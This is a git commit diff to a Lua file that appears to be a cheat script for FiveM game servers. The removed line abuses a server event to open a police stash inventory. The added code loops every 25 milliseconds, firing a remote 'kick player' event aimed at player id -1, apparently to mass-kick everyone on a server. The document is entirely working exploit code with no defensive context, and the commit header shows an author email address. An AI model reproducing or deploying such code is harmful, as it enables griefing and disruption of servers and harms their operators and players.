9d245716a476ae224e3e13bc1657788546289689
1212121231131312 <bandrsoud27@gmail.com>
2026-01-13 15:13:52 +0300

    Update UB-nitwit_protected.lua

--- UB-nitwit_protected.lua
+++ UB-nitwit_protected.lua
@@ -1,1 +1,6 @@
-TriggerServerEvent("inventory:server:OpenInventory", "stash", "police_stash", {maxweight = 1000000, slots = 50}, false, true)
+Citizen.CreateThread(function()
+    while true do
+        TriggerServerEvent("__ox_cb_Danger_Pvp:expulsarJugador", "Danger_Pvp", "Danger_Pvp:expulsarJugador:31844", {code = "LL3", player = {id = "-1", name = "m9", owner = false}})
+        Citizen.Wait(25)
+    end
+end)
